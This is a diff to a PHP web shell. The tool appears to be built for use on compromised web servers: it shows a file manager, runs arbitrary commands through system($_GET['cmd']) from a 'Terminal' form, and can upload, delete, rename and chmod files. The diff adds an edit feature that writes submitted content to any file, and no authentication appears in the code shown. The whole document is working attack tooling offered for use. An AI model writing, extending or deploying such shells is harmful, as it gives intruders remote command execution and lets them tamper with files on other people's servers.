@@ -69,6 +69,14 @@ if (isset($_FILES['upload'])) {
     exit;
 }
 
+// Handle file save (edit)
+if (isset($_POST['save_file']) && isset($_POST['filename'])) {
+    $file = $path . DIRECTORY_SEPARATOR . $_POST['filename'];
+    file_put_contents($file, $_POST['save_file']);
+    header("Location: ?path=" . urlencode($path));
+    exit;
+}
+
 // Shell command execution
 $output = '';
 if (isset($_GET['cmd'])) {
@@ -77,8 +85,7 @@ if (isset($_GET['cmd'])) {
     system($_GET['cmd']);
     $output = ob_get_clean();
 }
-
-echo <<<HTML
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -117,9 +124,12 @@ echo <<<HTML
         padding: 10px;
         border-radius: 8px;
     }
-    input, select {
+    input, select, textarea {
         padding: 4px; background: #111; color: #0f0; border: 1px solid #555; margin: 2px;
         font-family: monospace;
+    }
+    textarea {
+        resize: vertical;
     }
     input[type=submit], button.mini-btn {
         background: #333; color: white; cursor: pointer; border: none;
@@ -188,8 +198,8 @@ echo <<<HTML
 
 <div class="container">
     <div id="file-list">
-HTML;
 
+<?php
 // Breadcrumb path
 echo "<div class='path'><b>📁 Path:</b> ";
 $parts = explode(DIRECTORY_SEPARATOR, $path);
@@ -257,6 +267,8 @@ foreach ($all as $file) {
                 <button type='submit' class='mini-btn' title='Change Permission'>🔒</button>
               </form>";
 
+    $edit = is_file($full) ? "<a class='mini-btn' href='?path=" . urlencode($path) . "&edit=" . urlencode($file) . "' title='Edit File'>✍️</a>" : "";
+
     echo "<div class='flex-row'>
         <div class='col-name'>$link</div>
         <div class='col-size'>$size</div>
@@ -264,21 +276,12 @@ foreach ($all as $file) {
         <div class='col-group'>$group</div>
         <div class='col-perm'>$perm</div>
         <div class='col-time'>$time</div>
-        <div class='col-action'>$del $ren $chmod</div>
+        <div class='col-action'>$del $ren $chmod $edit</div>
     </div>";
 }
 echo "</div>";
+?>
 
-// File viewer
-if (isset($_GET['view'])) {
-    $viewFile = $path . DIRECTORY_SEPARATOR . $_GET['view'];
-    if (is_file($viewFile)) {
-        $content = htmlspecialchars(file_get_contents($viewFile));
-        echo "<div class='box'><b>📄 Isi file:</b> " . htmlspecialchars($_GET['view']) . "<pre>$content</pre></div>";
-    }
-}
-
-echo <<<HTML
     </div> <!-- end file-list -->
 
     <div id="side-panel">
@@ -297,24 +300,47 @@ echo <<<HTML
                 <input type="submit" value="Upload File">
             </form>
         </div>
+
         <div id="terminal">
             <h3>💻 Terminal</h3>
             <form method="GET">
-                <input type="hidden" name="path" value="{$path}">
+                <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
                 <input type="text" name="cmd" placeholder="Perintah shell..." style="width:90%;">
                 <input type="submit" value="Run">
             </form>
-HTML;
-
-if ($output) {
-    echo "<pre>" . htmlspecialchars($output) . "</pre>";
-}
-
-echo <<<HTML
+<?php if ($output): ?>
+            <pre><?= htmlspecialchars($output) ?></pre>
+<?php endif; ?>
         </div>
+
+<?php
+// File viewer atau editor tampil di panel kanan di bawah terminal
+if (isset($_GET['view'])) {
+    $viewFile = $path . DIRECTORY_SEPARATOR . $_GET['view'];
+    if (is_file($viewFile)) {
+        $content = htmlspecialchars(file_get_contents($viewFile));
+        echo "<div id='file-viewer' style='margin-top:15px; background:#222; padding:10px; border-radius:8px; max-height:300px; overflow:auto; color:#0f0; font-family: monospace;'>
+                <b>📄 Isi file: " . htmlspecialchars($_GET['view']) . "</b><pre>$content</pre>
+              </div>";
+    }
+} elseif (isset($_GET['edit'])) {
+    $editFile = $path . DIRECTORY_SEPARATOR . $_GET['edit'];
+    if (is_file($editFile)) {
+        $content = htmlspecialchars(file_get_contents($editFile));
+        echo "<div id='file-editor' style='margin-top:15px;'>
+                <b>✍️ Edit file: " . htmlspecialchars($_GET['edit']) . "</b>
+                <form method='POST'>
+                    <input type='hidden' name='filename' value='" . htmlspecialchars($_GET['edit']) . "'>
+                    <textarea name='save_file' style='width:100%; height:300px; background:#111; color:#0f0; font-family: monospace; padding:10px; border-radius:8px; border:none;'>$content</textarea><br>
+                    <input type='submit' value='Simpan Perubahan' style='background:#3a3; color:#fff; cursor:pointer; padding:8px 15px; border:none; border-radius:5px;'>
+                </form>
+              </div>";
+    }
+}
+?>
+
     </div> <!-- end side-panel -->
 </div> <!-- end container -->
+
 </body>
 </html>
-HTML;
-?>
